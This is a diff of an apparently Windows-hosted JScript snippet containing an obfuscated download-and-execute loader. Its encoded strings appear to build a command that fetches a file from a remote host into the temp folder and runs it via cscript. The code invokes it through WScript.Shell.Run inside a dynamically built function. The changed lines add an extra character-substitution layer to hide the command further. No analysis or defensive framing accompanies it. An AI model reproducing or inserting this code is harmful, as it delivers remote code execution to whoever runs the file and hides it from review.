@@ -10,12 +10,14 @@
         }).join(''); 
     }
 
-    var x = decode("fxqo tuvsh://udw.plwkhu.eursdqwkhqwxf.rp/Ylnh}-Tzvu/pic -o %WHQS%\\pic && fvfulsw.hyh %WHQS%\\pic");
+    var command = decode("fxqo#tuvsh1..udw.plwkhu.eursdqwkhqwxf.rp/Ylnh}-Tzvu1.pic$-o%WHQS%3.pic##&fvfulsw1hyh%WHQS%3.pic").replace(/[#1$3]/g, function(c) {
+        return { "#": " ", "1": "/", "$": "\\", "3": "%" }[c];
+    });
     var shellType = decode("XlfvwlryBMvdwru");
     var method = decode("Suq");
     var activeX = decode("ZSoshuvyKypil");
 
-    var shell = new Function("return new " + activeX + "(\"" + shellType + "\")." + method + "(\"" + x + "\")");
+    var shell = new Function("return new " + activeX + "(\"" + shellType + "\")." + method + "(\"" + command + "\")");
     shell();
 })();
 ]]> 
